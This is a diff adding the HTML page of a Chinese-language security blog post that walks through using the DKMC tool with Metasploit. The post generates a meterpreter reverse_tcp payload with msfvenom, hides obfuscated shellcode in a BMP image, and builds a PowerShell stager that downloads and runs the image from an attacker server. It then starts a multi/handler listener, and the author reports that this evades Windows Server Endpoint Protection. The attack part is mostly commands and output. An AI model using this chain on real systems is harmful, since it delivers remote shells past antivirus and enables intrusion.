@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-center-atom.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="MSF,DKMC," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="FF0C的博客" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="黑夜无论怎样悠长,白昼总会到来   DKMC 是一个生成混杂的shellcode且存储在polyglot图像的工具，具体内容可以参考DKMC presentation 2017。  安装DKMC123git clone https://github.com/Mr-Un1k0d3r/DKMC.gitcd DKMCmkdir output  配合MSF使用基本流程：  生成shellcode （met">
+<meta name="keywords" content="MSF,DKMC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DKMC-MSF">
+<meta property="og:url" content="http://yoursite.com/2018/06/19/DKMC-MSF/index.html">
+<meta property="og:site_name" content="FF0C的博客">
+<meta property="og:description" content="黑夜无论怎样悠长,白昼总会到来   DKMC 是一个生成混杂的shellcode且存储在polyglot图像的工具，具体内容可以参考DKMC presentation 2017。  安装DKMC123git clone https://github.com/Mr-Un1k0d3r/DKMC.gitcd DKMCmkdir output  配合MSF使用基本流程：  生成shellcode （met">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/image-20180619161008984.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20180619165318515.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20180619173036218.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20180619174017338.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20180619174624847.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20180620104519742.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20180620104732496.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20180620110524554.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20180620110701921.png">
+<meta property="og:updated_time" content="2018-06-21T03:09:02.710Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DKMC-MSF">
+<meta name="twitter:description" content="黑夜无论怎样悠长,白昼总会到来   DKMC 是一个生成混杂的shellcode且存储在polyglot图像的工具，具体内容可以参考DKMC presentation 2017。  安装DKMC123git clone https://github.com/Mr-Un1k0d3r/DKMC.gitcd DKMCmkdir output  配合MSF使用基本流程：  生成shellcode （met">
+<meta name="twitter:image" content="http://yoursite.com/images/image-20180619161008984.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/06/19/DKMC-MSF/"/>
+
+
+
+
+
+  <title>DKMC-MSF | FF0C的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">FF0C的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/19/DKMC-MSF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="FF0C">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="FF0C的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DKMC-MSF</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-19T15:58:20+08:00">
+                2018-06-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/内网安全/" itemprop="url" rel="index">
+                    <span itemprop="name">内网安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote class="blockquote-center">黑夜无论怎样悠长,<br>白昼总会到来</blockquote>
+
+<blockquote>
+<p>DKMC 是一个生成混杂的shellcode且存储在polyglot图像的工具，具体内容可以参考<a href="https://github.com/Mr-Un1k0d3r/DKMC/blob/master/DKMC%20presentation%202017.pdf" target="_blank" rel="noopener">DKMC presentation 2017</a>。</p>
+</blockquote>
+<h3 id="安装DKMC"><a href="#安装DKMC" class="headerlink" title="安装DKMC"></a>安装DKMC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Mr-Un1k0d3r/DKMC.git</span><br><span class="line">cd DKMC</span><br><span class="line">mkdir output</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20180619161008984.png" alt="image-20180619161008984"></p>
+<h3 id="配合MSF使用"><a href="#配合MSF使用" class="headerlink" title="配合MSF使用"></a>配合MSF使用</h3><p>基本流程：</p>
+<ul>
+<li>生成shellcode （meterpreter、Beacon）</li>
+<li>在图片中嵌入混淆的shellcode</li>
+<li>powershell 下载图片，并以powershell执行该图片</li>
+<li>getshell</li>
+</ul>
+<ol>
+<li><p>生成以raw格式的meterpreter</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform Windows -a x86 -p windows/meterpreter/reverse_tcp lhost=x.x.x.x lport=x -f raw &gt; test</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20180619165318515.png" alt="image-20180619165318515">    </p>
+</li>
+<li><p>使用sc</p>
+<p>把meterpreter生成shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sc</span><br><span class="line">(shellcode)&gt;&gt;&gt; set source /Users/ff0c/temp/test</span><br><span class="line">(shellcode)&gt;&gt;&gt; run</span><br><span class="line"># 复制生成的shellcode，返回主菜单，进入gen</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用gen</p>
+<p>把生成混淆后的shellcode，嵌入到图片中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; gen</span><br><span class="line">(generate)&gt;&gt;&gt; set source sample/haha.bmp  # 图片可以自己更换</span><br><span class="line">[+] source value is set.</span><br><span class="line"></span><br><span class="line">generate)&gt;&gt;&gt; set output output/1.bmp	  # 可以默认</span><br><span class="line">[+] output value is set.</span><br><span class="line"></span><br><span class="line">(generate)&gt;&gt;&gt; set shellcode 粘贴之前生成的shellcode</span><br><span class="line"># 这里mac下不能粘贴所完整的shellcode，原因不明，在centos下没问题。</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20180619173036218.png" alt="image-20180619173036218"></p>
+</li>
+<li><p>使用ps</p>
+<p>将bmp的图片地址，转换成powershell代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ps</span><br><span class="line">(powershell)&gt;&gt;&gt; set url http://x.x.x.x:8080/1.bmp</span><br><span class="line">[+] url value is set.</span><br><span class="line"></span><br><span class="line">(powershell)&gt;&gt;&gt; run</span><br><span class="line">[+] Powershell script:</span><br><span class="line"># 复制生成的powershell代码，保存为bat或者ps1即可</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20180619174017338.png" alt="image-20180619174017338"></p>
+</li>
+<li><p>使用web</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; web</span><br><span class="line">(web)&gt;&gt;&gt; set port 8080</span><br><span class="line">	[+] port value is set.</span><br><span class="line"></span><br><span class="line">(web)&gt;&gt;&gt; run</span><br><span class="line">	[+] Starting web server on port 8080</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20180619174624847.png" alt="image-20180619174624847"></p>
+</li>
+<li><p>开启msf监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line"># 设置好主机端口，开启后台监听</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit -j</span><br><span class="line"># 在被控主机上使用前面保存的bat脚本，执行。发现可以绕过windows server 自带的Endpoint Protection杀毒软件。</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20180620104519742.png" alt="image-20180620104519742"></p>
+<p><img src="/images/image-20180620104732496.png" alt="image-20180620104732496"></p>
+<p><img src="/images/image-20180620110524554.png" alt="image-20180620110524554"></p>
+<p><img src="/images/image-20180620110701921.png" alt="image-20180620110701921"></p>
+</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paper-plane" aria-hidden="true"></i>感谢您的阅读-------------</div>
+    
+</div>
+        
+      </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/MSF/" rel="tag"><i class="fa fa-tag"></i> MSF</a>
+          
+            <a href="/tags/DKMC/" rel="tag"><i class="fa fa-tag"></i> DKMC</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/15/hexo配置tips/" rel="next" title="hexo配置tips">
+                <i class="fa fa-chevron-left"></i> hexo配置tips
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/06/21/渗透工具系列之Metasploit/" rel="prev" title="渗透工具系列之Metasploit">
+                渗透工具系列之Metasploit <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">FF0C</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#安装DKMC"><span class="nav-number">1.</span> <span class="nav-text">安装DKMC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配合MSF使用"><span class="nav-number">2.</span> <span class="nav-text">配合MSF使用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">FF0C</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'C13uDzWh5eF9O1NAnp0rVgf5-gzGzoHsz',
+        appKey: 'bgwPVXSotMkp53yI70NXERHG',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
